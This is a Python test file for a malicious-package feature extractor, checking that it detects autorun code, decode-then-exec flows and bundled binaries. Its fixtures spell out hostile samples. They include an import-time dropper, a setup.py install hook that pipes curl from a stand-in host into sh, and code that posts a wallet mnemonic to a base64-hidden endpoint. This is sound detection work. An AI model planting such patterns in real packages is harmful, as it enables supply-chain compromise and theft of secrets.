"""Behaviour features: autorun reachability, data-flow, tradecraft, non-Python payloads."""

from __future__ import annotations

import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

from features import extract_features  # noqa: E402


def _pkg(tmp_path: Path, files: dict[str, str | bytes]) -> dict[str, float]:
    for rel, body in files.items():
        p = tmp_path / rel
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_bytes(body) if isinstance(body, bytes) else p.write_text(body)
    return extract_features(tmp_path, "", set())


def test_import_time_dropper_is_autorun(tmp_path):
    f = _pkg(tmp_path, {"pkg/__init__.py": (
        "import urllib.request, os, threading, tempfile\n"
        "_BIN = os.path.join(tempfile.gettempdir(), '.x')\n"
        "def _setup():\n"
        "    urllib.request.urlretrieve('https://example.invalid/b', _BIN)\n"
        "    os.chmod(_BIN, 0o755)\n"
        "threading.Thread(target=_setup, daemon=True).start()\n")})
    assert f["autorun_import_network"] >= 1
    assert f["autorun_spawn"] == 1
    assert f["flow_download_execute"] == 1


def test_defined_but_never_called_is_not_autorun(tmp_path):
    f = _pkg(tmp_path, {"pkg/client.py": (
        "import requests\n"
        "def fetch(url):\n"
        "    return requests.get(url)\n")})
    assert f["autorun_import_network"] == 0
    assert f["call_network"] == 1  # the v1 count still sees it


def test_install_command_run_method_is_install_time(tmp_path):
    f = _pkg(tmp_path, {"setup.py": (
        "from setuptools import setup\n"
        "from setuptools.command.install import install\n"
        "import subprocess\n"
        "class Evil(install):\n"
        "    def run(self):\n"
        "        subprocess.Popen('curl -s http://x.invalid/a | sh', shell=True)\n"
        "        install.run(self)\n"
        "setup(name='x', cmdclass={'install': Evil})\n")})
    assert f["autorun_install_process"] >= 1
    assert f["proc_shell_downloader"] == 1


def test_decode_then_exec_across_lines(tmp_path):
    f = _pkg(tmp_path, {"pkg/core.py": (
        "import base64\n"
        "def go(blob):\n"
        "    code = base64.b64decode(blob).decode()\n"
        "    exec(code)\n")})
    assert f["flow_decode_exec"] == 1
    assert f["decode_then_exec"] == 0  # the single-expression v1 feature misses it


def test_network_to_exec(tmp_path):
    f = _pkg(tmp_path, {"pkg/core.py": (
        "import urllib.request\n"
        "def go():\n"
        "    with urllib.request.urlopen('https://x.invalid') as r:\n"
        "        data = r.read()\n"
        "    exec(data)\n")})
    assert f["flow_net_exec"] == 1


def test_regex_compile_is_not_exec(tmp_path):
    f = _pkg(tmp_path, {"pkg/__init__.py": "import re\nPAT = re.compile(r'\\d+')\n"})
    assert f["autorun_import_exec"] == 0


def test_hidden_process_and_temp_exec(tmp_path):
    f = _pkg(tmp_path, {"pkg/__init__.py": (
        "import subprocess\n"
        "subprocess.Popen(['python3', '/tmp/managed.pyz'], start_new_session=True)\n")})
    assert f["proc_hidden"] == 1 and f["proc_temp_exec"] == 1
    assert f["autorun_import_process"] == 1


def test_tests_do_not_count_as_autorun(tmp_path):
    f = _pkg(tmp_path, {"tests/test_cli.py": (
        "import subprocess, sys\n"
        "subprocess.run([sys.executable, '-c', 'print(1)'])\n")})
    assert f["autorun_import_process"] == 0 and f["proc_python_inline"] == 0


def test_compiled_init_and_binary_strings(tmp_path):
    f = _pkg(tmp_path, {
        "pkg/__init__.cpython-311-x86_64-linux-gnu.so":
            b"\x7fELF\x00\x00https://discord.com/api/webhooks/1/abc\x00curl -s http://a.invalid | sh\x00",
        "pkg/__main__.py": "from pkg import main\nmain()\n",
    })
    assert f["bin_compiled_init"] == 1 and f["bin_orphan_modules"] == 1
    assert f["bin_net_indicators"] >= 1 and f["bin_shell_cmd"] >= 1


def test_built_extension_with_source_is_not_orphan(tmp_path):
    f = _pkg(tmp_path, {"pkg/_speedups.c": "int x;\n", "pkg/_speedups.cpython-311.so": b"\x7fELF"})
    assert f["bin_orphan_modules"] == 0


def test_pth_autorun(tmp_path):
    f = _pkg(tmp_path, {"evil.pth": "import os; os.system('id')\n", "ok.pth": "src/\n"})
    assert f["pth_code_lines"] == 1


def test_bundled_native_library_loaded_on_import(tmp_path):
    f = _pkg(tmp_path, {"pkg/__init__.py": "from .u import *\n",
                        "pkg/u.py": "import os, ctypes\n"
                                    "t = ctypes.CDLL(os.path.dirname(__file__) + '/terminate.so')\n",
                        "pkg/terminate.so": b"\x7fELF"})
    assert f["autorun_native_load"] == 1 and f["bin_orphan_modules"] == 1


def test_system_library_load_is_not_bundled(tmp_path):
    f = _pkg(tmp_path, {"pkg/__init__.py": "import ctypes\nlibc = ctypes.CDLL('libc.so.6')\n"})
    assert f["autorun_native_load"] == 0


def test_hidden_endpoint_and_secret_send(tmp_path):
    f = _pkg(tmp_path, {"pkg/core.py": (
        "import base64, requests\n"
        "_E = 'aHR0cHM6Ly9leC5pbnZhbGlk'\n"
        "def backup(mnemonic_phrase):\n"
        "    url = base64.b64decode(_E).decode()\n"
        "    requests.post(url, json={'mnemonic': mnemonic_phrase}, timeout=3)\n")})
    assert f["flow_hidden_endpoint"] == 1 and f["flow_secret_send"] == 1
